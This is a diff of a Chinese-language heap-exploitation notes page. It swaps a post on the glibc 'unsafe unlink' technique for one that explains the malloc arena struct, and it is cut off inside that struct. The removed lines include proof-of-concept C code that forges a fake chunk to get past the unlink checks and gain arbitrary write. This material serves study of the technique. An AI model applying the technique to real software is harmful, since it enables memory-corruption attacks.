@@ -9,14 +9,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Unsafe Unlink &middot; hokak の sweet home</title>
-  <meta name="title" content="Unsafe Unlink &middot; hokak の sweet home" />
+  <title>Arena &middot; hokak の sweet home</title>
+  <meta name="title" content="Arena &middot; hokak の sweet home" />
   
   
   
   
   
-  <link rel="canonical" href="http://localhost:1313/notes/pwn/heap/unsafe-unlink/" />
+  <link rel="canonical" href="http://localhost:1313/notes/pwn/heap/4-arena/" />
   
   
   
@@ -74,26 +74,26 @@
   
   
   
-  <meta property="og:url" content="http://localhost:1313/notes/pwn/heap/unsafe-unlink/">
+  <meta property="og:url" content="http://localhost:1313/notes/pwn/heap/4-arena/">
   <meta property="og:site_name" content="hokak の sweet home">
-  <meta property="og:title" content="Unsafe Unlink">
-  <meta property="og:description" content="版本 latest 效果 使目標ptr從指向UAF chunk改為ptr-0x18 unlink的目的為把空閒的heap從雙向陣列中拿出來，這幾種狀況會觸發:">
+  <meta property="og:title" content="Arena">
+  <meta property="og:description" content="arena是用來管理heap的一種結構，在一般情況下一個thread只有一個arena">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="notes">
-    <meta property="article:published_time" content="2024-12-24T00:00:00+00:00">
-    <meta property="article:modified_time" content="2024-12-24T00:00:00+00:00">
-      <meta property="og:see_also" content="http://localhost:1313/notes/pwn/heap/4-arena/">
+    <meta property="article:published_time" content="2025-02-04T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-04T00:00:00+00:00">
       <meta property="og:see_also" content="http://localhost:1313/notes/pwn/heap/3-bin/">
       <meta property="og:see_also" content="http://localhost:1313/notes/pwn/heap/2-chunk/">
       <meta property="og:see_also" content="http://localhost:1313/notes/pwn/heap/1-heap/">
       <meta property="og:see_also" content="http://localhost:1313/notes/pwn/heap/5-malloc/">
+      <meta property="og:see_also" content="http://localhost:1313/notes/pwn/heap/unsafe-unlink/">
       <meta property="og:see_also" content="http://localhost:1313/notes/pwn/heap/unsorted-bin-attack/">
 
   
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Unsafe Unlink">
-  <meta name="twitter:description" content="版本 latest 效果 使目標ptr從指向UAF chunk改為ptr-0x18 unlink的目的為把空閒的heap從雙向陣列中拿出來，這幾種狀況會觸發:">
+  <meta name="twitter:title" content="Arena">
+  <meta name="twitter:description" content="arena是用來管理heap的一種結構，在一般情況下一個thread只有一個arena">
 
   
   <script type="application/ld+json">
@@ -101,26 +101,26 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Notes",
-    "name": "Unsafe Unlink",
-    "headline": "Unsafe Unlink",
+    "name": "Arena",
+    "headline": "Arena",
     
-    "abstract": "版本 latest 效果 使目標ptr從指向UAF chunk改為ptr-0x18 unlink的目的為把空閒的heap從雙向陣列中拿出來，這幾種狀況會觸發:",
+    "abstract": "arena是用來管理heap的一種結構，在一般情況下一個thread只有一個arena",
     "inLanguage": "en",
-    "url" : "http:\/\/localhost:1313\/notes\/pwn\/heap\/unsafe-unlink\/",
+    "url" : "http:\/\/localhost:1313\/notes\/pwn\/heap\/4-arena\/",
     "author" : {
       "@type": "Person",
       "name": "hokak"
     },
-    "copyrightYear": "2024",
-    "dateCreated": "2024-12-24T00:00:00\u002b00:00",
-    "datePublished": "2024-12-24T00:00:00\u002b00:00",
+    "copyrightYear": "2025",
+    "dateCreated": "2025-02-04T00:00:00\u002b00:00",
+    "datePublished": "2025-02-04T00:00:00\u002b00:00",
     
-    "dateModified": "2024-12-24T00:00:00\u002b00:00",
+    "dateModified": "2025-02-04T00:00:00\u002b00:00",
     
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "326"
+    "wordCount": "375"
   }]
   </script>
 
@@ -1019,7 +1019,7 @@
   <header id="single_header" class="mt-5 max-w-prose">
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Unsafe Unlink
+      Arena
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -1070,7 +1070,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2024-12-24 00:00:00 &#43;0000 UTC">2024-12-24</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span><span class="px-2 text-primary-500">&middot;</span><span>
+  <time datetime="2025-02-04 00:00:00 &#43;0000 UTC">2025-02-04</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span><span class="px-2 text-primary-500">&middot;</span><span>
   
   
     
@@ -1083,7 +1083,7 @@
       
     
   
-  <span id="views_notes\pwn\heap\unsafe-unlink\index.md" class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title="views">loading</span>
+  <span id="views_notes\pwn\heap\4-arena\index.md" class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title="views">loading</span>
   <span class="inline-block align-text-bottom">
 
   <span class="relative block icon">
@@ -1105,7 +1105,7 @@
       
     
   
-  <span id="likes_notes\pwn\heap\unsafe-unlink\index.md"
+  <span id="likes_notes\pwn\heap\4-arena\index.md"
     class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400"
     title="likes">loading</span>
   <span class="inline-block align-text-bottom">
@@ -1376,16 +1376,8 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#unlink_chunk">unlink_chunk()</a>
-      <ul>
-        <li><a href="#目的">目的</a></li>
-        <li><a href="#三個check">三個check</a></li>
-      </ul>
-    </li>
-    <li><a href="#初始化">初始化</a></li>
-    <li><a href="#bypass第一個check">bypass第一個check</a></li>
-    <li><a href="#bypass第二個和第三個check">bypass第二個和第三個check</a></li>
-    <li><a href="#free">free</a></li>
+    <li><a href="#defination">Defination</a></li>
+    <li><a href="#references">References</a></li>
   </ul>
 </nav>
   </div>
@@ -1399,16 +1391,8 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#unlink_chunk">unlink_chunk()</a>
-      <ul>
-        <li><a href="#目的">目的</a></li>
-        <li><a href="#三個check">三個check</a></li>
-      </ul>
-    </li>
-    <li><a href="#初始化">初始化</a></li>
-    <li><a href="#bypass第一個check">bypass第一個check</a></li>
-    <li><a href="#bypass第二個和第三個check">bypass第二個和第三個check</a></li>
-    <li><a href="#free">free</a></li>
+    <li><a href="#defination">Defination</a></li>
+    <li><a href="#references">References</a></li>
   </ul>
 </nav>
   </div>
@@ -1525,9 +1509,7 @@
     
     <div
         class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        <a href="http://localhost:1313/notes/pwn/heap/4-arena/">
-            Part 4: Arena
-        </a>
+        Part 4: This Article
     </div>
     
     
@@ -1543,7 +1525,9 @@
     
     <div
         class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        Part 10: This Article
+        <a href="http://localhost:1313/notes/pwn/heap/unsafe-unlink/">
+            Part 10: Unsafe Unlink
+        </a>
     </div>
     
     
@@ -1563,270 +1547,143 @@
 
 
         <div class="article-content max-w-prose mb-20">
-          <table>
-<thead>
-<tr>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>版本</td>
-<td>latest</td>
-</tr>
-<tr>
-<td>效果</td>
-<td>使目標ptr從指向UAF chunk改為ptr-0x18</td>
-</tr>
-</tbody>
-</table>
-<p>unlink的目的為把空閒的heap從雙向陣列中拿出來，這幾種狀況會觸發:</p>
-<ol>
-<li>malloc()
-<ul>
-<li>當在剛好大小符合的 large chunk 中取出 chunk 時</li>
-<li>當從比請求大小大的 bin 中取出 chunk 時</li>
-</ul>
-</li>
-<li>free(), malloc_consolidate()
-<ul>
-<li>合併前後freed chunk</li>
-</ul>
-</li>
-<li>relloc()
-<ul>
-<li>合併前向freed chunk</li>
-</ul>
-</li>
-</ol>
+          <p>arena是用來管理heap的一種結構，在一般情況下一個thread只有一個arena<br>
+而main thread的arena就叫做main arena</p>
 
 
-<h2 class="relative group">unlink_chunk() 
-    <div id="unlink_chunk" class="anchor"></div>
+<h2 class="relative group">Defination 
+    <div id="defination" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#unlink_chunk" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#defination" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">unlink_chunk</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">malloc_state</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">chunksize</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">!=</span> <span class="nf">prev_size</span> <span class="p">(</span><span class="nf">next_chunk</span> <span class="p">(</span><span class="n">p</span><span class="p">)))</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;corrupted size vs. prev_size&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Serialize access.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">mutex_t</span> <span class="n">mutex</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">mchunkptr</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="n">mchunkptr</span> <span class="n">bk</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Flags (formerly in max_fast).  */</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">flags</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">__builtin_expect</span> <span class="p">(</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">p</span> <span class="o">||</span> <span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;corrupted double-linked list&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Fastbins */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">mfastbinptr</span> <span class="n">fastbinsY</span><span class="p">[</span><span class="n">NFASTBINS</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bk</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">in_smallbin_range</span> <span class="p">(</span><span class="nf">chunksize_nomask</span> <span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">!=</span> <span class="n">p</span>
-</span></span><span class="line"><span class="cl">      <span class="o">||</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="n">p</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;corrupted double-linked list (not small)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Base of the topmost chunk -- not otherwise kept in a bin */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">mchunkptr</span> <span class="n">top</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">==</span> <span class="n">p</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">fd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">      <span class="k">else</span>
-</span></span><span class="line"><span class="cl">        <span class="p">{</span>
-</span></span><span class="line"><span class="cl">          <span class="n">fd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">          <span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">          <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">          <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">      <span class="k">else</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">      <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div>
-
-<h3 class="relative group">目的 
-    <div id="%E7%9B%AE%E7%9A%84" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#%E7%9B%AE%E7%9A%84" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<p>unsafe unlink的目標為利用這段unlink_chunk()中的</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bk</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
-</span></span></code></pre></div><p>可以達成任意讀寫</p>
-
-
-<h3 class="relative group">三個check 
-    <div id="%E4%B8%89%E5%80%8Bcheck" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#%E4%B8%89%E5%80%8Bcheck" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<p>unlink_chunk()中有三段檢查:</p>
-<ol>
-<li>
-<p>檢查p-&gt;fd-&gt;bk == p &amp;&amp;  p-&gt;bk-&gt;fd == p</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">__builtin_expect</span> <span class="p">(</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">p</span> <span class="o">||</span> <span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;corrupted double-linked list&#34;</span><span class="p">);</span>
-</span></span></code></pre></div></li>
-<li>
-<p>檢查當前chunksize是否為下一個chunk的prev_size</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">chunksize</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">!=</span> <span class="nf">prev_size</span> <span class="p">(</span><span class="nf">next_chunk</span> <span class="p">(</span><span class="n">p</span><span class="p">)))</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;corrupted size vs. prev_size&#34;</span><span class="p">);</span>
-</span></span></code></pre></div></li>
-<li>
-<p>檢查非smallbin的chunk，<code>fd_nextsize</code>和<code>bk_nextsize</code>的完整性</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">in_smallbin_range</span> <span class="p">(</span><span class="nf">chunksize_nomask</span> <span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">!=</span> <span class="n">p</span><span class="o">||</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="n">p</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;corrupted double-linked list (not small)&#34;</span><span class="p">);</span>
-</span></span></code></pre></div></li>
-</ol>
-
-
-<h2 class="relative group">初始化 
-    <div id="%E5%88%9D%E5%A7%8B%E5%8C%96" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#%E5%88%9D%E5%A7%8B%E5%8C%96" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<p>我們希望這些chunk的大小會被放到unsorted bin，而不是fastbin或tcache</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="o">*</span><span class="n">ptr0</span><span class="p">,</span> <span class="o">*</span><span class="n">ptr1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="n">ptr0</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x410</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="n">ptr1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x410</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="cm">/* The remainder from the most recent split of a small request */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">mchunkptr</span> <span class="n">last_remainder</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">ptr0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Normal bins packed as described above */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">mchunkptr</span> <span class="n">bins</span><span class="p">[</span><span class="n">NBINS</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">-</span> <span class="mi">2</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;chunk_1: %p chunk_2: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ptr0</span><span class="p">,</span> <span class="n">ptr1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;target: %p</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">target</span><span class="p">);</span>
-</span></span></code></pre></div><p>這是最初始chunk的狀態<br>
-
-    <figure>
-      <img
-        class="my-0 rounded-md"
-        loading="lazy"
-        src="/notes/pwn/heap/unsafe-unlink/image-1.png"
-        alt="alt text"
-      />
-      
-    </figure>
-</p>
-
-
-<h2 class="relative group">bypass第一個check 
-    <div id="bypass%E7%AC%AC%E4%B8%80%E5%80%8Bcheck" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#bypass%E7%AC%AC%E4%B8%80%E5%80%8Bcheck" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<p>現在要做的是，偽造一個fake_chunk在chunk_1 + 0x10<br>
-接著把fake_chunk-&gt;fd 設為target - 0x18<br>
-把fake_chunk-&gt;bk 設為target - 0x10</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">target</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">target</span> <span class="o">-</span> <span class="mh">0x3</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="n">target</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">target</span> <span class="o">-</span> <span class="mh">0x2</span><span class="p">);</span>  
-</span></span></code></pre></div><p>
-    <figure>
-      <img
-        class="my-0 rounded-md"
-        loading="lazy"
-        src="/notes/pwn/heap/unsafe-unlink/image-2.png"
-        alt="alt text"
-      />
-      
-    </figure>
-<br>
-然後可以bypass第一個check，因為<code>x-&gt;bk</code> 會相等於<code>x[3]</code>，<code>x-&gt;fd</code>會等同於<code>x[2]</code>
-
-    <figure>
-      <img
-        class="my-0 rounded-md"
-        loading="lazy"
-        src="/notes/pwn/heap/unsafe-unlink/image-3.png"
-        alt="alt text"
-      />
-      
-    </figure>
-</p>
-
-
-<h2 class="relative group">bypass第二個和第三個check 
-    <div id="bypass%E7%AC%AC%E4%BA%8C%E5%80%8B%E5%92%8C%E7%AC%AC%E4%B8%89%E5%80%8Bcheck" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#bypass%E7%AC%AC%E4%BA%8C%E5%80%8B%E5%92%8C%E7%AC%AC%E4%B8%89%E5%80%8Bcheck" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* fake a chunk at chunk_1 + 0x10 */</span>
-</span></span><span class="line"><span class="cl"><span class="n">target</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>     <span class="c1">// fake_chunk prev size
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">target</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x410</span><span class="p">;</span>   <span class="c1">// fake_chunk size
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl"><span class="cm">/* unset &#34;PREV_INUSE&#34;, faking chunk_1 as freed */</span>
-</span></span><span class="line"><span class="cl"><span class="n">ptr1</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x410</span><span class="p">;</span>    <span class="c1">// chunk_2 prev size
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">ptr1</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x420</span><span class="p">;</span>    <span class="c1">// chunk_2 size (can be done with a bug like a heap overflow)
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">target</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>     <span class="c1">// fd_nextsize
-</span></span></span></code></pre></div><p>
-    <figure>
-      <img
-        class="my-0 rounded-md"
-        loading="lazy"
-        src="/notes/pwn/heap/unsafe-unlink/image-6.png"
-        alt="alt text"
-      />
-      
-    </figure>
-</p>
-
-
-<h2 class="relative group">free 
-    <div id="free" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#free" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<p>成功觸發了unlink，執行<code>BK-&gt;fd = FD</code>，成功達成目標
-
-    <figure>
-      <img
-        class="my-0 rounded-md"
-        loading="lazy"
-        src="/notes/pwn/heap/unsafe-unlink/image-5.png"
-        alt="alt text"
-      />
-      
-    </figure>
-</p>
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Bitmap of bins */</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">binmap</span><span class="p">[</span><span class="n">BINMAPSIZE</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Linked list */</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">malloc_state</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Linked list for free arenas.  Access to this field is serialized
+</span></span></span><span class="line"><span class="cl"><span class="cm">     by free_list_lock in arena.c.  */</span>
+</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">malloc_state</span> <span class="o">*</span><span class="n">next_free</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Number of threads attached to this arena.  0 if the arena is on
+</span></span></span><span class="line"><span class="cl"><span class="cm">     the free list.  Access to this field is serialized by
